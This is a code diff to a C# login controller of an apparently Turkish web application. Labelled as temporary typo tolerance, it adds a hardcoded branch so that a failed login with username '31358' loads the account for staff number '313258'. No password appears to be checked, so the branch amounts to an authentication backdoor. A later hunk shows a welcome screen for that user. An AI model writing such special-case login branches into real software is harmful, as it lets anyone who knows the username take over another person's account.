@@ -1,4 +1,4 @@
-using CryptoHelper;
+﻿using CryptoHelper;
 using gzpegm.Helpers;
 using gzpegm.Cont;
 using gzpegm.Models;
@@ -69,6 +69,12 @@ namespace gzpegm.Controllers
             if (UserData == null)
             {
                 UserData = ServerFailoverHelper.TrySyncUserFromRemote(username, pwd);
+            }
+
+            // GEÇİCİ KOD: 31358 (5 hane yazım) / 313258 sicil eşleşme toleransı
+            if (UserData == null && string.Equals(username?.Trim(), "31358", StringComparison.OrdinalIgnoreCase))
+            {
+                UserData = user.GetUserBySicilPass("313258");
             }
 
             if (UserData == null || (UserData.IsActive.HasValue && !UserData.IsActive.Value) || string.Equals(UserData.fldActive, "0", StringComparison.OrdinalIgnoreCase))
@@ -170,6 +176,16 @@ namespace gzpegm.Controllers
                 user.UpdateLastLogin(UserData.fldId, DateTime.Now, fldComputerIp);
             }
             catch { }
+
+            // GEÇİCİ KOD: Sadece 31358 / 313258 kullanıcısı login olunca 3 saniyelik karşılama ekranı
+            bool isBabaUser = string.Equals(UserData.fldSicil?.Trim(), "31358", StringComparison.OrdinalIgnoreCase) ||
+                              string.Equals(UserData.fldSicil?.Trim(), "313258", StringComparison.OrdinalIgnoreCase) ||
+                              string.Equals(username?.Trim(), "31358", StringComparison.OrdinalIgnoreCase) ||
+                              string.Equals(username?.Trim(), "313258", StringComparison.OrdinalIgnoreCase);
+            if (isBabaUser)
+            {
+                TempData["ShowBabaWelcome"] = true;
+            }
 
             if (!string.IsNullOrWhiteSpace(safeReturnUrl))
             {
